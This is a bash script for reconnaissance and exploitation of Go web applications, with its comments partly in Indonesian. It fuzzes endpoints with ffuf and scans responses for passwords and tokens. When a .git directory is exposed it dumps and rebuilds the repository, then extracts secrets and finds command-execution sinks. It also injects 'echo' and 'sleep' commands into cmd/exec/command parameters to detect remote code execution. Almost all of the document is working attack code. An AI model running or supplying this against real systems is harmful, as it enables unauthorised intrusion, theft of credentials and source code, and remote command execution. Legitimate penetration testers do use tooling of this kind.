#!/usr/bin/env bash
set -euo pipefail

TARGET=${1:? "Usage: $0 <target>"}
OUTPUT="recon_$(date +%Y%m%d_%H%M%S)"
WORDLIST="go_wordlist.txt"

mkdir -p "$OUTPUT"

echo "[+] Target: $TARGET"
echo "[+] Output: $OUTPUT"

# =========================
# 0. Dependency Check
# =========================
for bin in curl ffuf jq git grep awk sed; do
    command -v $bin >/dev/null || { echo "[!] $bin not installed"; exit 1; }
done

# =========================
# 1. Fingerprinting
# =========================
echo "[+] Fingerprinting..."

HEADERS=$(curl -s -I "$TARGET" || true)
BODY=$(curl -s "$TARGET" | head -n 50 || true)

echo "$HEADERS" > "$OUTPUT/headers.txt"
echo "$BODY" > "$OUTPUT/body_snippet.txt"

TECH="unknown"

if echo "$HEADERS $BODY" | grep -Eqi "golang|gin|fiber|echo|net/http"; then
    TECH="go"
fi

echo "[+] Tech detected: $TECH"

# =========================
# 2. Surface Discovery
# =========================
echo "[+] Running ffuf..."

ffuf -u "$TARGET/FUZZ" \
-w "$WORDLIST" \
-o "$OUTPUT/ffuf.json" -of json \
-t 50 -mc 200,204,301,302,307 \
-fs 0 -ac -s || true

echo "[+] ffuf scan completed"

# VALIDASI FILE
if [ ! -f "$OUTPUT/ffuf.json" ]; then
    echo "[!] ffuf output missing"
    exit 1
fi

FOUND=$(jq '.results | length' "$OUTPUT/ffuf.json" 2>/dev/null || echo 0)

echo "[+] Found $FOUND endpoints"

if [ "$FOUND" -eq 0 ]; then
    echo "[-] No endpoints discovered"
fi

# =========================
# 3. Parse Results
# =========================
jq -r '.results[].url' "$OUTPUT/ffuf.json" > "$OUTPUT/urls.txt" 2>/dev/null || true

# =========================
# 4. File Validation
# =========================
echo "[+] Validating discovered files..."

> "$OUTPUT/sensitive.txt"

while read -r url; do
    [ -z "$url" ] && continue

    RES=$(curl -s "$url" || true)

    if echo "$RES" | grep -Eqi "password|secret|token|apikey"; then
        echo "[HIGH] Sensitive file → $url"
        echo "$url" >> "$OUTPUT/sensitive.txt"
    fi

    if echo "$RES" | grep -qi "package main"; then
        echo "[INFO] Go source exposed → $url"
    fi

done < "$OUTPUT/urls.txt"

# =========================
# 5. Git Exposure
# =========================
echo "[+] Checking .git exposure..."

GIT_EXPOSED="NO"

if curl -s "$TARGET/.git/HEAD" | grep -q "ref:"; then
    echo "[HIGH] Git exposed!"
    GIT_EXPOSED="YES"

    mkdir -p "$OUTPUT/git_dump"

    ./gitdumper.sh "$TARGET/.git/" "$OUTPUT/git_dump" || echo "[!] git dump failed"

    if [ -d "$OUTPUT/git_dump/.git" ]; then
        echo "[+] Reconstructing repo..."
        pushd "$OUTPUT/git_dump" > /dev/null
        git checkout . 2>/dev/null || true

        echo "[+] Extracting secrets..."
        grep -rEi "password|token|secret|key" . > ../secrets.txt || true

        echo "[+] Finding RCE patterns..."
        grep -rEi "exec\.Command|system\(|popen|subprocess" . > ../rce_candidates.txt || true

        popd > /dev/null
    fi
fi

# =========================
# 6. RCE Testing (IMPROVED)
# =========================
echo "[+] Testing RCE..."

> "$OUTPUT/rce.txt"

for param in cmd exec command; do
    MARK="RCE_$(openssl rand -hex 3)"

    RES=$(curl -s "$TARGET/?$param=echo+$MARK" || true)

    if echo "$RES" | grep -q "$MARK"; then
        echo "[LOW] Reflection via $param"
    fi

    # TIME-BASED VALIDATION (lebih reliable)
    START=$(date +%s)
    curl -s "$TARGET/?$param=sleep+3" > /dev/null || true
    END=$(date +%s)

    DIFF=$((END - START))

    if [ "$DIFF" -ge 3 ]; then
        echo "[CRITICAL] Possible RCE via $param"
        echo "$param" >> "$OUTPUT/rce.txt"
    fi
done

# =========================
# 7. REPORT
# =========================
echo "[+] Generating report..."

cat <<EOF > "$OUTPUT/report.txt"
TARGET: $TARGET
TECH: $TECH

--- FINDINGS ---
Git Exposure: $GIT_EXPOSED

Sensitive Files:
$(cat "$OUTPUT/sensitive.txt" 2>/dev/null)

RCE Params:
$(cat "$OUTPUT/rce.txt" 2>/dev/null)

Secrets (sample):
$(head -n 20 "$OUTPUT/secrets.txt" 2>/dev/null)

EOF

echo "[+] Done. Output: $OUTPUT"
